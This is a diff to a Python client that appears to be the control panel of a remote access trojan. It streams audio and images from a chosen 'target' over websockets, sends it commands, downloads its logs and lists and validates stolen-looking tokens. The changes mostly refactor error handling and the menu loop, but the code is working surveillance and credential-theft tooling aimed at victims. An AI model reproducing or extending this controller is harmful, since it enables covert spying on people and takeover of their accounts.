@@ -192,22 +192,6 @@ class Main:
             time.sleep(2)
 
             while not self.Stop:
-                self.j = False
-
-                start = time.time()
-                threading.Thread(target=self.recv, args=(ws,)).start()
-                while not self.j:
-                    if time.time()-start >= 5:
-                        return
-                j = self.j
-
-                if (time.time()-j["t"] > 10) or (j["t"] < l):
-                    print(time.time()-j["t"])
-                    print(j["t"] > l)
-                    continue
-
-                l = j["t"]
-                count += 1
 
                 filename = f"sounds/sound_{count}.wav"
 
@@ -217,6 +201,9 @@ class Main:
                         file.write(data)
                         file.close()
                     queue.put(filename)
+
+                except KeyboardInterrupt:
+                    break
                     
                 except Exception as e:
                     print(e)
@@ -266,13 +253,16 @@ class Main:
             while not self.Stop:
                 try:
                     recv_data = json.loads(ws.recv())
-                except:
+                except KeyboardInterrupt:
+                    break
+
+                except Exception as e:
+                    print(e)
                     ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
                     ws.send(self.key)
                     ws.send(target)
-
-                if ( abs(recv_data["t"]- time.time() ) < 2.5) and (recv_data["t"] > start_time):
                     continue
+
                 try:
                     data = base64.b64decode(recv_data["data"])
                     threading.Thread(target=self.edit, args=(panel, data)).start()
@@ -295,8 +285,10 @@ class Main:
             ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
             ws.send(self.key)
             ws.send(target)
-            w = ws.recv()
-            data = base64.b64decode(json.loads(w)["data"])
+
+            recv = ws.recv()
+            data = base64.b64decode(json.loads(recv)["data"])
+
             f = io.BytesIO(data)
             pilimage = Image.open(f)
             img = ImageTk.PhotoImage(pilimage)
@@ -386,23 +378,26 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
 
             except:
                 uiprint("Invalid option!", "error")
+                time.sleep(1)
+                self.clear()
                 continue
 
             if choice == 19:
+                tokens = self.get_tokens()
                 if not tokens:
                     self.uiprint('No available tokens.', 'error')
-                    self.clear()
-                    self.getInput()
 
                 for token in tokens:
                     print(f"Token: {token}")
                 
-                if not self.check(token):
-                    uiprint('Invalid Token', 'error')
-                else:
-                    uiprint('Valid Token!')
+                    if not self.check(token):
+                        uiprint('Invalid Token', 'error')
+                    else:
+                        uiprint('Valid Token!')
 
                 input(">> Press enter to continue")
+                time.sleep(1)
+                self.clear()
                 continue
 
             elif choice == 20:
@@ -412,10 +407,14 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                     file.write(download)
 
                 uiprint("Downloaded logs are in 'logs.zip'")
+                time.sleep(1)
+                self.clear()
                 continue
 
             elif choice == 21:
                 self.get_input(choose=False)
+                time.sleep(1)
+                self.clear()
                 continue
 
             target = self.get_input()
@@ -425,6 +424,9 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 time.sleep(1)
                 self.clear()
                 continue
+
+            elif command:
+                self.send_command(command, target)
 
             if choice == 1:
                 try:
@@ -468,11 +470,8 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 
             elif choice == 8:                
                 self.Audio(target, self.host, self.key)
-
-            if command:
-                self.send_command(command, target)
+            else:
                 uiprint('Command Sent!')
-
 
             time.sleep(1)
             self.clear()
